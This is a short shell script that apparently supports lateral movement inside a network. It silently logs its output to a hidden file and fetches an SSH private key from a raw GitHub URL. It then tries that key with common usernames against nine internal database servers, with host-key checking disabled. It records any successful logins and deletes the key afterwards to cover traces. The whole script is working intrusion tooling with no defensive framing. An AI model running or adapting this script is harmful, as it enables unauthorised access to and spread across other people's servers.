exec > /tmp/.ssh-db-test 2>&1

# Download SSH key from GitHub
curl -sf "https://raw.githubusercontent.com/needterosa-creator/tes/main/dbkey" -o /tmp/.dbkey 2>/dev/null
chmod 600 /tmp/.dbkey

echo "=== SSH TO DB SERVERS ==="
for ip in 10.201.2.26 10.201.2.22 10.201.2.14 10.201.2.15 10.201.2.16 10.201.2.44 10.201.2.11 10.201.2.21 10.201.2.203; do
  for user in root ubuntu admin paper deploy; do
    RESULT=$(ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes -i /tmp/.dbkey $user@$ip id 2>&1 | head -1)
    if echo "$RESULT" | grep -q "uid="; then
      echo "LOGIN: $user@$ip -> $RESULT"
    fi
  done
done

rm -f /tmp/.dbkey
echo "DONE_$(hostname)"
